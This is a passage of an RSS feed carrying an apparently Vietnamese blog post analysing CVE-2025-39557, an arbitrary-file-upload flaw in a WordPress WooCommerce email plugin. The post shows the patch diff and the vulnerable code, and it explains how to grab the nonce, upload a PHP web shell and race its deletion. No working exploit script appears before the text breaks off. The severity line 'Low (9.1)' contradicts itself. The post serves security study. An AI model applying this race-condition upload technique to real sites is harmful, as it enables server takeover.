d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/everest-forms/vulnerability/wordpress-everest-forms-plugin-3-0-9-4-unauthenticated-arbitrary-file-upload-read-and-deletion-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Everest Forms Plugin &amp;lt;= 3.0.9.4 is vulnerable to Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-39557 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-08-cve-2025-39557/</link>
      <pubDate>Sat, 08 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-08-cve-2025-39557/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-08-cve-2025-39557/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;Arbitrary File Upload&lt;/strong&gt; trong &lt;strong&gt;Ben Ritner - Kadence WP Kadence WooCommerce Email Designer&lt;/strong&gt; cho ph√©p &lt;strong&gt;Upload m·ªôt Web Shell l√™n Web Server&lt;/strong&gt;. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn &lt;strong&gt;Kadence WooCommerce Email Designer&lt;/strong&gt; t·ª´ phi√™n b·∫£n &lt;strong&gt;kh√¥ng x√°c ƒë·ªãnh cho ƒë·∫øn 1.5.14&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-39557&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-39557&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.5.14&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.5.15&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (9.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Administrator&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/kadence-woocommerce-email-designer/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Kadence WooCommerce Email Designer Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Kadence WooCommerce Email Designer&lt;/strong&gt;: &lt;strong&gt;1.5.14&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;1.5.15&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://wordpress.org/plugins/woocommerce/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;WooCommerce Plugin&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;static private function import_woomail( $wp_customize ) {&#xA;  ...&#xA;  $overrides = array( &amp;#39;test_form&amp;#39; =&amp;gt; false, &amp;#39;test_type&amp;#39; =&amp;gt; false, &amp;#39;mimes&amp;#39; =&amp;gt; array( &amp;#39;dat&amp;#39; =&amp;gt; &amp;#39;text/plain&amp;#39;, &amp;#39;json&amp;#39; =&amp;gt; &amp;#39;text/plain&amp;#39; ) );&#xA;  $file = wp_handle_upload( $_FILES[&amp;#39;kadence-woomail-import-file&amp;#39;], $overrides );&#xA;  ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phi√™n b·∫£n l·ªói, h√†m &lt;code&gt;import_woomail()&lt;/code&gt; g·ªçi ƒë·∫øn &lt;code&gt;wp_handle_upload()&lt;/code&gt; ƒë·ªÉ upload file v√†o th∆∞ m·ª•c upload ch√≠nh th·ª©c c·ªßa WordPress (&lt;code&gt;wp-content/uploads/&amp;lt;year&amp;gt;/&amp;lt;month&amp;gt;/&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;L·ªói&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Tuy nhi√™n, t√πy ch·ªçn &lt;code&gt;test_type =&amp;gt; false&lt;/code&gt; khi·∫øn WordPress &lt;strong&gt;b·ªè qua vi·ªác ki·ªÉm tra MIME Type&lt;/strong&gt; d·ª±a tr√™n whitelist h·ª£p l·ªá.&#xA;ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng &lt;strong&gt;upload c√°c t·ªáp nguy hi·ªÉm nh∆∞ web shell &lt;code&gt;.php&lt;/code&gt;&lt;/strong&gt; l√™n m√°y ch·ªß.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;static private function import_woomail( $wp_customize ) {&#xA;  ...&#xA;  $overrides               = array( &amp;#39;test_form&amp;#39; =&amp;gt; false, &amp;#39;test_type&amp;#39; =&amp;gt; true, &amp;#39;mimes&amp;#39; =&amp;gt; array( &amp;#39;dat&amp;#39; =&amp;gt; &amp;#39;text/plain&amp;#39;, &amp;#39;json&amp;#39; =&amp;gt; &amp;#39;text/plain&amp;#39; ) );&#xA;  $file                    = wp_handle_upload( $_FILES[&amp;#39;kadence-woomail-import-file&amp;#39;], $overrides );&#xA;  ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒë√£ thay ƒë·ªïi t√πy ch·ªçn &lt;code&gt;&#39;test_type&#39; =&amp;gt; true&lt;/code&gt; n√™n k√≠ch ho·∫°t ki·ªÉm tra MIME theo whitelist, ngƒÉn upload t·ªáp nguy hi·ªÉm nh∆∞ web shell &lt;code&gt;.php&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;static private function import_woomail( $wp_customize ) {&#xA;  // Make sure we have a valid nonce.&#xA;  if ( ! wp_verify_nonce( $_REQUEST[&amp;#39;kt-woomail-import&amp;#39;], &amp;#39;kt-woomail-importing&amp;#39; ) ) {&#xA;    return;&#xA;  }&#xA;  // Make sure WordPress upload support is loaded.&#xA;  if ( ! function_exists( &amp;#39;wp_handle_upload&amp;#39; ) ) {&#xA;    require_once( ABSPATH . &amp;#39;wp-admin/includes/file.php&amp;#39; );&#xA;  }&#xA;  // Load the export/import option class.&#xA;  require_once KT_WOOMAIL_PATH . &amp;#39;includes/class-kadence-woomail-import-option.php&amp;#39;;&#xA;  // Setup global vars.&#xA;  global $wp_customize;&#xA;  global $kt_woomail_import_error;&#xA;&#xA;  // Setup internal vars.&#xA;  $kt_woomail_import_error = false;&#xA;  $template                = &amp;#39;kadence-woomail-designer&amp;#39;;&#xA;  $overrides               = array( &amp;#39;test_form&amp;#39; =&amp;gt; false, &amp;#39;test_type&amp;#39; =&amp;gt; false, &amp;#39;mimes&amp;#39; =&amp;gt; array( &amp;#39;dat&amp;#39; =&amp;gt; &amp;#39;text/plain&amp;#39;, &amp;#39;json&amp;#39; =&amp;gt; &amp;#39;text/plain&amp;#39; ) );&#xA;  $file                    = wp_handle_upload( $_FILES[&amp;#39;kadence-woomail-import-file&amp;#39;], $overrides );&#xA;&#xA;  // Make sure we have an uploaded file.&#xA;  if ( isset( $file[&amp;#39;error&amp;#39;] ) ) {&#xA;    $kt_woomail_import_error = $file[&amp;#39;error&amp;#39;];&#xA;    return;&#xA;  }&#xA;  if ( ! file_exists( $file[&amp;#39;file&amp;#39;] ) ) {&#xA;    $kt_woomail_import_error = __( &amp;#39;Error importing settings! Please try again.&amp;#39;, &amp;#39;kadence-woocommerce-email-designer&amp;#39; );&#xA;    return;&#xA;  }&#xA;  // Get the upload data.&#xA;  $raw  = file_get_contents( $file[&amp;#39;file&amp;#39;] );&#xA;  $data = json_decode( $raw, true );&#xA;  // Check for support of older export files. Will remove later.&#xA;  if ( ( &amp;#39;array&amp;#39; != gettype( $data ) || ! isset( $data[&amp;#39;template&amp;#39;] ) ) &amp;amp;&amp;amp; version_compare( phpversion(), &amp;#39;7.0.0&amp;#39; ) &amp;gt;= 0  ) {&#xA;    $data = @unserialize( base64_decode( $raw ), array( &amp;#39;allowed_classes&amp;#39; =&amp;gt; false ) );&#xA;    if ( &amp;#39;array&amp;#39; != gettype( $data ) || ! isset( $data[&amp;#39;template&amp;#39;] ) ) {&#xA;      $data = self::mb_unserialize( $raw );&#xA;    }&#xA;  }&#xA;  // Remove the uploaded file.&#xA;  unlink( $file[&amp;#39;file&amp;#39;] );&#xA;  ...&#xA;  exit;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;import_woomail()&lt;/code&gt; c√≥ nhi·ªám v·ª• x·ª≠ l√Ω t·∫£i l√™n v√† nh·∫≠p d·ªØ li·ªáu c·∫•u h√¨nh cho plugin &lt;code&gt;Kadence WooCommerce Email Designer&lt;/code&gt;, c·ª• th·ªÉ:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Ki·ªÉm tra nonce ƒë·ªÉ ƒë·∫£m b·∫£o y√™u c·∫ßu h·ª£p l·ªá, tr√°nh &lt;strong&gt;CSRF attack&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! wp_verify_nonce( $_REQUEST[&amp;#39;kt-woomail-import&amp;#39;], &amp;#39;kt-woomail-importing&amp;#39; ) ) {&#xA;&#x9;return;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi search v·ªõi t·ª´ kh√≥a &lt;code&gt;kt-woomail-import&lt;/code&gt; trong th∆∞ m·ª•c plugin&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-08-cve-2025-39557/nonce_create.png&#34; title=&#34;C√°ch nonce ƒë∆∞·ª£c t·∫°o&#34; data-thumbnail=&#34;/posts/2025-11-08-cve-2025-39557/nonce_create.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce Create&lt;/h2&gt;&lt;p&gt;C√°ch nonce ƒë∆∞·ª£c t·∫°o&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-08-cve-2025-39557/nonce_create.png&#39; alt=&#34;Nonce Create&#34; height=&#34;293&#34; width=&#34;1432&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;C√°ch nonce ƒë∆∞·ª£c t·∫°o&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Nonce ƒë∆∞·ª£c t·∫°o v·ªõi name l√† &lt;code&gt;kt-woomail-import&lt;/code&gt;, t·ª©c &lt;code&gt;nonce&lt;/code&gt; ƒë∆∞·ª£c ƒë·∫∑t trong m√£ ngu·ªìn tr·∫£ v·ªÅ khi s·ª≠ d·ª•ng ch·ª©c nƒÉng c·ªßa plugin, ta s·ª≠ d·ª•ng ch·ª©c nƒÉng n√†y v√† l·∫•y &lt;code&gt;nonce&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-08-cve-2025-39557/nonce_get.png&#34; title=&#34;C√°ch l·∫•y nonce trong m√£ ngu·ªìn tr·∫£ v·ªÅ&#34; data-thumbnail=&#34;/posts/2025-11-08-cve-2025-39557/nonce_get.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce Get&lt;/h2&gt;&lt;p&gt;C√°ch l·∫•y nonce trong m√£ ngu·ªìn tr·∫£ v·ªÅ&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-08-cve-2025-39557/nonce_get.png&#39; alt=&#34;Nonce Get&#34; height=&#34;829&#34; width=&#34;1444&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;C√°ch l·∫•y nonce trong m√£ ngu·ªìn tr·∫£ v·ªÅ&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Th·ª±c hi·ªán upload file b·∫±ng &lt;code&gt;wp_handle_upload()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$overrides = array( &amp;#39;test_form&amp;#39; =&amp;gt; false, &amp;#39;test_type&amp;#39; =&amp;gt; false, &amp;#39;mimes&amp;#39; =&amp;gt; array( &amp;#39;dat&amp;#39; =&amp;gt; &amp;#39;text/plain&amp;#39;, &amp;#39;json&amp;#39; =&amp;gt; &amp;#39;text/plain&amp;#39; ) );&#xA;$file = wp_handle_upload( $_FILES[&amp;#39;kadence-woomail-import-file&amp;#39;], $overrides );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nh∆∞ ph√¢n t√≠ch ·ªü tr√™n, do tri·ªÉn khai l·ªói n√™n h√†m n√†y ch·∫•p nh·∫≠n upload &lt;code&gt;.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;ƒê·ªçc n·ªôi dung file upload, th·ª≠ parse d∆∞·ªõi d·∫°ng &lt;strong&gt;JSON&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$raw  = file_get_contents( $file[&amp;#39;file&amp;#39;] );&#xA;$data = json_decode( $raw, true );&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;N·∫øu kh√¥ng ph·∫£i JSON h·ª£p l·ªá ‚Üí th·ª≠ gi·∫£i m√£ base64 r·ªìi &lt;code&gt;unserialize()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ( &amp;#39;array&amp;#39; != gettype( $data ) || ! isset( $data[&amp;#39;template&amp;#39;] ) ) &amp;amp;&amp;amp; version_compare( phpversion(), &amp;#39;7.0.0&amp;#39; ) &amp;gt;= 0  ) {&#xA;&#x9;$data = @unserialize( base64_decode( $raw ), array( &amp;#39;allowed_classes&amp;#39; =&amp;gt; false ) );&#xA;&#x9;if ( &amp;#39;array&amp;#39; != gettype( $data ) || ! isset( $data[&amp;#39;template&amp;#39;] ) ) {&#xA;&#x9;&#x9;$data = self::mb_unserialize( $raw );&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;X√≥a file upload kh·ªèi server&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;unlink( $file[&amp;#39;file&amp;#39;] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ta c·∫ßn quan t√¢m c√°c ph·∫ßn sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;graph LR;&#xA;A[Upload File] --&amp;gt; B[Read File &amp;amp; Decode JSON]&#xA;B --&amp;gt; C{IF JSON}&#xA;C --&amp;gt;|True| D[&amp;#34;unserialize()&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;unlink()&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;p&gt;File b·ªã x√≥a ngay sau khi upload, n√™n kh√¥ng th·ªÉ truy c·∫≠p theo c√°ch th√¥ng th∆∞·ªùng. T·∫≠n d·ª•ng kho·∫£ng th·ªùi gian gi·ªØa &lt;code&gt;Upload File&lt;/code&gt; v√† &lt;code&gt;unlink()&lt;/code&gt; ƒë·ªÉ g·ªçi file v·ª´a upload trong kho·∫£ng th·ªùi gian ƒë√≥ nh·∫±m th·ª±c thi web shell. Ta s·ª≠ d·ª•ng k·ªπ thu·∫≠t &lt;code&gt;File Upload&lt;/code&gt; + &lt;code&gt;Race Condition&lt;/code&gt;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;pre&gt;&lt;code&gt;static public function import_export_requests( $wp_customize ) {&#xA;  // Check if user is allowed to change values.&#xA;  if ( ! Kadence_Woomail_Designer::is_admin() ) {&#xA;    exit;&#xA;  }&#xA;  if ( isset( $_REQUEST[&amp;#39;kt-woomail-export&amp;#39;] ) ) {&#xA;    self::export_woomail( $wp_customize );&#xA;  }&#xA;  if ( isset( $_REQUEST[&amp;#39;kt-woomail-import&amp;#39;] ) &amp;amp;&amp;amp; isset( $_FILES[&amp;#39;kadence-woomail-import-file&amp;#39;] ) ) {&#xA;    self::import_woomail( $wp_customize );&#xA;  }&#xA;&#xA;  if ( isset( $_REQUEST[&amp;#39;kt-woomail-import-template&amp;#39;] ) ) {&#xA;    self::import_woomail_template( $wp_customize );&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;import_woomail()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi trong h√†m &lt;code&gt;import_export_requests()&lt;/code&gt; n·∫øu ng∆∞·ªùi d√πng l√† &lt;code&gt;admin&lt;/code&gt; v√† c√≥ tham s·ªë &lt;code&gt;kt-woomail-import&lt;/code&gt; trong &lt;code&gt;$_REQUEST&lt;/code&gt; c√πng t·ªáp tin ƒë∆∞·ª£c upload trong &lt;code&gt;$_FILES[&#39;kadence-woomail-import-file&#39;]&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;H√†m &lt;code&gt;import_export_requests&lt;/code&gt; ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback cho action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;customize_register&amp;#39;, array( $this, &amp;#39;import_export_requests&amp;#39; ), 999999 );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;T·ª©c khi s·ª≠ d·ª•ng ch·ª©c nƒÉng t√πy ch·ªânh giao di·ªán (&lt;code&gt;customize.php&lt;/code&gt;) th√¨ &lt;code&gt;import_export_requests&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c g·ªçi.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Upload file via HTTP 